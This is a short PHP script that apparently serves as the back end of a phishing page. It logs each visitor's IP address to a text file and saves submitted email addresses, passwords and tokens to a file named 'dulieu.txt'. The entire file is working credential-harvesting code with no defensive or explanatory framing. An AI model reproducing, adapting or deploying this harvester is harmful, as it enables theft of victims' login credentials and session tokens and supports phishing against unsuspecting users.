<?php

$ips=$_SERVER['REMOTE_ADDR'];
$path="logs-ip.txt";
$file=fopen($path, "a+");
$write=fwrite($file,"$ips\n");
fclose($file);

$e = $_POST['email'];
$p = $_POST['pass'];
$t = $_POST['token'];
if($e){
    $filename = 'dulieu.txt';
	$fp = fopen($filename, "a");
	fwrite($fp, "$e|$p|$t"."\n");
	fclose($fp);
}

?>
     